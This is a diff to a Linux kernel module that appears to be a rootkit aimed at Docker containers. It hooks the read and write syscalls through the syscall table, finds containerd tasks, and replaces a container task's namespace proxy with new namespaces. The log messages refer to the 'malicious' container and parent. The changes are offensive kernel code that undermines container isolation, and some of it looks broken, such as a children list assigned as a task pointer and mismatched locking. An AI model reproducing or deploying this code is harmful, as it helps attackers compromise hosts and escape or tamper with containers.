@@ -1007,48 +1007,6 @@ int setup_devnull_comm_channel(void)
 // ========== END COMM CHANNEL ==========
 
 /*
- * Copy/pasted from Linux sources, as it appears that it's
- * not being exported
-*/
-/*
-void switch_task_namespaces(struct task_struct *p, struct nsproxy *new)
-{
-	struct nsproxy *ns;
-
-	might_sleep();
-
-	task_lock(p);
-	ns = p->nsproxy;
-	p->nsproxy = new;
-	task_unlock(p);
-
-	if (ns && atomic_dec_and_test(&ns->count))
-		free_nsproxy(ns);
-}
-*/
-/*
- * Copy/pasted from Linux sources, as it appears that it's
- * not being exported
-*/
-/*
-static struct kmem_cache *nsproxy_cachep;
-
-void free_nsproxy(struct nsproxy *ns)
-{
-	if (ns->mnt_ns)
-		put_mnt_ns(ns->mnt_ns);
-	if (ns->uts_ns)
-		put_uts_ns(ns->uts_ns);
-	if (ns->ipc_ns)
-		put_ipc_ns(ns->ipc_ns);
-	if (ns->pid_ns_for_children)
-		put_pid_ns(ns->pid_ns_for_children);
-	put_net(ns->net_ns);
-	kmem_cache_free(nsproxy_cachep, ns);
-}
-*/
-
-/*
  * Lists the current tasks in the system
  * @return true on success, false on failure
 */
@@ -1079,34 +1037,50 @@ int list_tasks(void){
 
 /*
  * Display the pointers (addresses) of each namespace inside the task (container)
-*/
-void show_ns_pointers(struct task_struct *tsk){
-    //lock the parent task (i.e. containerd-shim)
-    task_lock(tsk);
+*/ 
+void show_ns_pointers(struct task_struct *tsk, struct task_struct *parent_target){
     struct nsproxy *parent_nsproxy = tsk->nsproxy;
+    struct nsproxy *child_nsproxy;
+    
+    struct task_struct *target_tsk;
+    struct nsproxy *new_ns;
+    target_tsk = &parent_target->children;	//this is the actual container task
+    task_lock(target_tsk);
+    struct user_namespace *user_ns = task_cred_xxx(target_tsk, user_ns); 
+    new_ns = create_new_namespaces(CLONE_NEWNS, target_tsk, user_ns, target_tsk->fs);
+    if(IS_ERR(new_ns)){
+    	pr_info("Could not copy namespaces\n");
+    }
+    //lock the (malicious) parent task (i.e. containerd-shim) 
+    task_lock(tsk);
     if(parent_nsproxy != NULL){
         pr_info("Parent mnt_ns address: %p\n", parent_nsproxy->mnt_ns);
         if(!list_empty(&tsk->children)){
        	    struct task_struct *child;
-            pr_info("This task has children\n");
+            pr_info("Found the malicious container task\n");
             list_for_each_entry(child, &tsk->children, children){
                 //lock the child task (i.e. the actual container)
 		task_lock(child);
-                pr_info("PID of child: %u\n", child->pid);
-		struct nsproxy *child_nsproxy = child->nsproxy;
+                //pr_info("PID of child: %u\n", child->pid);
+		child_nsproxy = child->nsproxy;
 		if(child_nsproxy != NULL){
-		    pr_info("Child mnt_ns address BEFORE: %p\n", child_nsproxy->mnt_ns);
-                    //Change the child's namespace address with the parent's ns address
-		    child->nsproxy->mnt_ns = parent_nsproxy->mnt_ns;
-      	            /* The next line is not necesary (function call) */
-		    //switch_task_namespaces(child, parent_nsproxy);
-		    pr_info("Child mnt_ns address AFTER: %p\n", child_nsproxy->mnt_ns);
-		}
-		task_unlock(child);
-            }
+		    pr_info("Malicious mnt_ns address BEFORE: %p\n", child_nsproxy->mnt_ns);
+                    child->nsproxy = new_ns;
+		    //Change the child's namespace address with the parent's ns address
+		    //if(child->nsproxy->mnt_ns == 0x00007f1fa8f28722){
+		    	//child->nsproxy->mnt_ns = 0x00007f5c27ecb722; //parent_nsproxy->mnt_ns;
+      	            	// The next line is not necesary (function call) //
+		    	//switch_task_namespaces(child, parent_nsproxy);
+		    }
+		    child_nsproxy = child->nsproxy;	
+		    pr_info("Malicious mnt_ns address AFTER: %p\n", child_nsproxy->mnt_ns);
+		    task_unlock(child);
+		}      
+	    } 
         }
-    }
-    task_unlock(tsk);
+
+    	task_unlock(tsk);
+	task_unlock(target_tsk);
 
     /*
     pr_info("Container namespace info: \n");
@@ -1127,6 +1101,8 @@ void show_ns_pointers(struct task_struct *tsk){
 int access_namespaces(void){
     struct task_struct *task;
     char *tsk_name;
+    struct task_struct *tsk_struct_list[1000];	//array of pointers to task_structs
+    int container_count = 0;	//keep count of the number of containers running
     for_each_process(task){
         char *buf_comm = kmalloc(sizeof(task->comm), GFP_KERNEL);
         if(!buf_comm){
@@ -1136,10 +1112,14 @@ int access_namespaces(void){
 	//The CFG_DOCKER_CONTAINER constant is defined in our config.h file
         if(strcmp(tsk_name, CFG_DOCKER_CONTAINER) == 0){
             pr_info("Found containerd \"%s\" with task PID: %d\n", tsk_name, task->pid);
-            show_ns_pointers(task);
+	    tsk_struct_list[container_count] = task;
+            ++container_count;
+	    //show_ns_pointers(task);
 	}
         kfree(buf_comm);
     }
+    show_ns_pointers(tsk_struct_list[container_count-2], tsk_struct_list[container_count-1]); 
+    pr_info("Total containers running: %d\n", container_count);
     return 1;
 }
 
@@ -1185,10 +1165,10 @@ int init(void)
      * note: parameter __NR_rmdir is the position number inside the syscall table
      * associated with the rmdir  syscall. This is defined in <asm/unistd.h>
      */
-    asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
-    asm_hook_create(sys_call_table[__NR_mkdir], asm_mkdir);
-    asm_hook_create(sys_call_table[__NR_kill], asm_kill);
-    asm_hook_create(sys_call_table[__NR_chmod], asm_chmod);
+    //asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
+    //asm_hook_create(sys_call_table[__NR_mkdir], asm_mkdir);
+    //asm_hook_create(sys_call_table[__NR_kill], asm_kill);
+    //asm_hook_create(sys_call_table[__NR_chmod], asm_chmod);
 
     /* Hook read() and write() syscalls with our own */
     hook_create(&sys_call_table[__NR_read], read);
@@ -1196,7 +1176,7 @@ int init(void)
 
     /* Functions to work with Docker containers */
     //list_tasks(); (not used for now)
-    //access_namespaces();
+    access_namespaces();
 
     return 0;
 }
